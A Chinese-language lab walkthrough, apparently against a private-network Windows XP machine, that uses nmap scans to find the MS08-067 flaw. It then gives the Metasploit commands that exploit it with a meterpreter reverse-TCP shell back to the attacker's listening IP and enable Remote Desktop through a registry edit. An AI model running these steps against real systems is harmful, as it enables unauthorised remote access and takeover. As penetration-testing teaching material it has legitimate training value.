# nmap结合metasploit入侵Xp 内网渗透

这个ip 192.168.159.140就是我们此次渗透测试的目标

![](../Images/d56358d5bb75e05ce2861bf3b2b0711d.png)

在kali上打开终端输入ifconfig查看一下本机的ip地址

![](../Images/d7a548150804e14b3fff320feb8ff18f.png)  
然后打开我们的msf 来调用nmap来扫描  输入命令 nmap  -sC 192.168.159.140   （ps:这条命令的功能主要是搜集各种应用服务的信息） 如图 开启了smtp服务  这样我们你可以通过nmap来爆破 当然这次我们不讲这个爆破  
![](../Images/0397c11fe12a75d81e863862de475b0c.png)  
![](../Images/60d700777b112e96ae3e1b6bbe9424d3.png)  
从扫描结果 我们可以得知开启 了 135 139 445这些非常 危险的端口 并且探测出目标主机的系统是xp  
![](../Images/66bdf594a3e29aa01bfdd36df606ac9d.png)nmap -script=smb-check-vulns.nse 192.168.159.140  然后我们用nmap的一个漏洞扫描脚本来扫描主机 （ps:不得不感叹nmap确实强大）  
![](../Images/77d4076dd1b683ee3289716e75145bd7.png)  
如图出现了一个非常危险且著名的漏洞 就是 MS08-067远程溢出漏洞  
![](../Images/a7d6b447cd4631ba76afc3a758cc22c6.png)  
终于轮到我们的msf登场了  我们输入命令search ms08\_067 来搜索这个漏洞利用模块 （ps: search  就是搜索的意思） 显然 我们已经搜索到了就是这个 exploit/windows/smb/ms08\_067\_netapi  
![](../Images/66bdf594a3e29aa01bfdd36df606ac9d.png)  
use  exploit/windows/smb/ms08\_067\_netapi  来调用这个模块 （ps: use就是使用的意思）  
![](../Images/e0402cc95d6f525d7cbb52f091c85c84.png)

如图 我们先用set payload windows/meterpreter/reverse\_tcp命令设置相应的shellcode

set RHOST 192.168.159.140目标主机的ip

set LHOST 192.168.159.129 本机ip用来监听

![](../Images/6a8fa6337a300d99e4047c9bdee938c8.png)

exploit!开始溢出  如图 已经建立了一个会话

![](../Images/565b1adb205edbb5e0ffe91a4f5587c7.png)

然后输入shell进入 xp的命令行模式

![](../Images/fed6d620971a0892cddc21ff108ef52c.png)

进去之后 最重要的 还是提权 这次提权非常简单 也就是建立个用户的过程 大家看图就行 在这就不解释了

![](../Images/c3c909868ba692f8381ebe2631ddbc8b.png)

因为我们用nmap扫描的时候 并没有开启3389端口  所以我们在输入REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f 这个命令开启

![](../Images/4c824b0234f5d3543cf57d1d257c66ca.png)
